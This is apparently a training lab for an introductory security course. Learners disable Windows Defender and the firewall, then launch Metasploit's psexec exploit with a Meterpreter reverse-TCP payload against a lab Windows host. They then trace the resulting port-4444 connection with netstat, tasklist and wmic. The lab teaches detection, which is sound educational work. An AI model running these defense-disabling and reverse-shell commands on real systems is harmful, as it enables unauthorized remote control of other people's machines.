![image](https://github.com/user-attachments/assets/068fae26-6e8f-402f-ad69-63a4e6a1f59e)

# Windows CLI

In this lab, we will create **malware**, run it, and use the tools we went through in the slides to look at what an attack looks like on a live system.  

One of the best ways to learn is to actually just dig in and do it.  






- Open **Ubuntu Shell**

<img width="90" height="104" alt="Screenshot From 2026-02-23 10-28-37" src="https://github.com/user-attachments/assets/ae6d408b-7622-4545-b849-aef3d8fa0cb4" />









Before going any further, we need to ensure that **Windows Defender** is disabled. To do this, open a Windows **Powershell** by clicking the icon in the taskbar.


<img width="74" height="91" alt="Screenshot From 2026-02-07 17-59-15" src="https://github.com/user-attachments/assets/be17e180-e1a4-4b42-b537-9b2931ac0284" />



```ps
Set-MpPreference -DisableRealtimeMonitoring $true
```

![](attachments/windowscli_disabledefender.png)

>[!NOTE]
>
>If you get red errors that say 
><pre>A general error occurred that is not covered by a more specific error code.</pre> 
>
>That is OK!  It means **Defender** was already disabled. </br>
>We run the above command to ensure that it is off for this lab.  It has a sneaky way of turning back on again...

Next, lets ensure the firewall is disabled.

```ps
netsh advfirewall set allprofiles state off
```

Next, set a password for the Administrator account that you can remember

```ps
net user Administrator password1234
```

>[!NOTE]
>
>That is a very bad password. </br> Come up with something better. But, please remember it.

Let's get our **Windows IP**:

```ps
ipconfig
```

<img width="629" height="253" alt="2026-03-15_23-42" src="https://github.com/user-attachments/assets/6a8b012f-cd92-47fd-8f0d-eac30d124877" />

Now head back to your **Linux** terminal.

We need to gain root access. To do that, run the following command:

```bash
sudo su -
```

Next, we will start the **Metasploit** handler with the following command:

```bash
msfconsole -q
```

It will take a second to connect, be patient!

When connected, our terminal will look like this.

<img width="62" height="41" alt="2026-03-15_23-29" src="https://github.com/user-attachments/assets/1595387c-029b-462c-90dd-4430c0856bed" />

Next, run the following command:

```bash
use exploit/windows/smb/psexec
```

<img width="677" height="88" alt="2026-03-15_23-36" src="https://github.com/user-attachments/assets/3918ae2d-9018-46e0-9e63-41536cafed35" />

We will continue by running this command to set the location of the payload:

```bash
set PAYLOAD windows/meterpreter/reverse_tcp
```

We also need to set the **RHOST IP** for the Windows system by using the following command:

```bash
set RHOST win.cloudlab.lan
```

<img width="711" height="108" alt="2026-03-15_23-39" src="https://github.com/user-attachments/assets/68a2b59f-01ae-4500-88cc-563275be4cb7" />

Next, we need to set the **SMB** username and password. 

```bash
set SMBUSER Administrator
```

```bash
set SMBPASS password1234
```

>[!NOTE]
>
>This will be the password you set earlier. </br>
>Hopefully your password is different than mine!

It should look like this:

<img width="556" height="81" alt="2026-03-15_23-40" src="https://github.com/user-attachments/assets/293e8c74-5e42-4108-b52e-b94f48536cdb" />

Now let's set the target to upload a **Raw Executable** instead of a **PowerShell Script**

```bash
show targets
```

```bash
set TARGET 2
```

<img width="456" height="344" alt="2026-03-15_23-56" src="https://github.com/user-attachments/assets/1554429f-fa6a-43e9-b202-bc32c8356223" />

Now, we can run the exploit command

```bash
exploit
```

<img width="964" height="262" alt="2026-03-15_23-57" src="https://github.com/user-attachments/assets/d49e2fb2-0a0d-4cb3-a4a8-1771dd4f70c4" />

While there is not much here for this lab, it is key to remember that these two commands would help us detect an attacker that is mounting shares on other computers (net view).  It would also tell us if an attacker had mounted a share on this system (net session). 

We are not done with network connections yet.  Lets try looking at our malware!

Go ahead an open an instance of **Windows PowerShell**.

<img width="74" height="91" alt="Screenshot From 2026-02-07 17-59-15" src="https://github.com/user-attachments/assets/be17e180-e1a4-4b42-b537-9b2931ac0284" />

Run the following command:

```bash
netstat -naob
```

<img width="743" height="578" alt="2026-03-16_00-02" src="https://github.com/user-attachments/assets/a30004d5-0d95-4800-93a3-8debde52f3a2" />


Well, that is a lot of data. This is showing us which ports are open on this system **(0.0.0.0:portnumber)** or **(LISTENING)**.
As well as the remote connections that are made to other systems **(ESTABLISHED)**.  In this example, we are really interested in the **ESTABLISHED** connections:

```bash
netstat -naob | findstr ESTABLISHED
```

<img width="945" height="387" alt="2026-03-16_00-01" src="https://github.com/user-attachments/assets/4bb6bd11-5df0-4d05-8120-1a80c4c2bdf8" />

Specificly, we are interested in the connection on port 4444 as we know this is the port we used for our malware.

Now, let's drill down on that connection with some more data:

```bash
netstat -f
```

I like to run **"-f"** with netstat to see if there are any systems with fully qualified domains that we may be able to ignore. 

![](attachments/windowscli_-f.png)

Now we see our last connection with the **port 4444**.

Let's get the Process ID **(PID)** from the output of our **"netstat -naob"** command that we ran earlier so we can dig a little deeper.

>[!TIP]
>
>Look for port **4444** and **[powershell.exe]**

![](attachments/windowscli_pid.png)

We will start with tasklist  

```bash
tasklist /m /fi "pid eq [PID]"
```

>[!NOTE]
>
>**YOUR PID WILL BE DIFFERENT!**

![](attachments/windowscli_tasklist.png)

We can see the loaded **DLL's** above.  As we can see, there is not a whole lot to see here:

Let's keep digging with **wmic**:

```bash
wmic process where processid=[PID] get commandline
```

![](attachments/windowscli_wmic.png)

Ahh!!  Now we can see that the file was launched from the **command line**!  We know this because there are no options.

Let's see if we can see what spawned the process with **wmic**.

```bash
wmic process get name,parentprocessid,processid | select-string [PID]
```

![](attachments/windowscli_selectstring.png)

Lets go through the steps we took to hunt for a malicious process

1. We found its parent process ID.  

2. We did a search on that process ID.  

3. As you can see above, it was launched by the cmd.exe process.  

4. Note that the search we just did may turn up some other things launched by the command line as well.

***                                                                 

<b><i>Continuing the course? </br>[Next Lab](/IntroClassFiles/Tools/IntroClass/Wireshark/Wireshark.md)</i></b>

<b><i>Want to go back? </br>[Previous Lab](/IntroClassFiles/Tools/IntroClass/WebLogReview/WebLogReview.md)</i></b>

<b><i>Looking for a different lab? </br>[Lab Directory](/IntroClassFiles/navigation.md)</i></b>

***Finished with the Labs?***

Please be sure to destroy the lab environment!

[Click here for instructions on how to destroy the Lab Environment](/IntroClassFiles/Tools/IntroClass/LabDestruction/labdestruction.md)

---







 



